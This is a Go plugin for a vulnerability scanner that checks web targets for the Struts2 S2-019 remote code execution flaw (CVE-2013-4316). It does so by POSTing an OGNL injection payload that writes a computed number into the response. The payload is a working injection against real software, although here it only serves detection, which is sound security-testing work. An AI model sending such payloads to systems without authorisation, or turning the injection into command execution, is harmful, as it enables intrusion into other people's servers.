package goplugin

import (
	"net/http"
	"regexp"
	"strings"

	"github.com/opensec-cn/kunpeng/plugin"
	"github.com/opensec-cn/kunpeng/util"
)

type struts2_19 struct {
	info   plugin.Plugin
	result []plugin.Plugin
}

func init() {
	plugin.Regist("struts2", &struts2_19{})
}
func (d *struts2_19) Init() plugin.Plugin {
	d.info = plugin.Plugin{
		Name:    "Struts2 s2-019 Dynamic method executions",
		Remarks: "Dynamic Method Invocation is a mechanism known to impose possible security vulnerabilities, but until now it was enabled by default with warning that users should switch it off if possible.",
		Level:   0,
		Type:    "RCE",
		Author:  "wolf",
		References: plugin.References{
			URL:  "https://cwiki.apache.org/confluence/display/WW/S2-019",
			CVE:  "CVE-2013-4316",
			KPID: "KP-0038",
		},
	}
	return d.info
}
func (d *struts2_19) GetResult() []plugin.Plugin {
	var result = d.result
	d.result = []plugin.Plugin{}
	return result
}
func (d *struts2_19) Check(URL string, meta plugin.TaskMeta) (b bool) {
	poc := "debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context[%23parameters.rpsobj[0]].getWriter().println(66666687-100)):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse"
	var checkURL string
	for _, url := range meta.FileList {
		if ok, _ := regexp.MatchString(`\.(do|action)$`, url); ok {
			checkURL = url
			break
		}
	}
	if checkURL == "" {
		return false
	}
	request, err := http.NewRequest("POST", checkURL, strings.NewReader(poc))
	request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	if err != nil {
		return false
	}
	resp, err := util.RequestDo(request, true)
	if err != nil {
		return false
	}
	if strings.Contains(resp.ResponseRaw, "66666587") {
		result := d.info
		result.Response = resp.ResponseRaw
		result.Request = resp.RequestRaw
		d.result = append(d.result, result)
		return true
	}
	return false
}
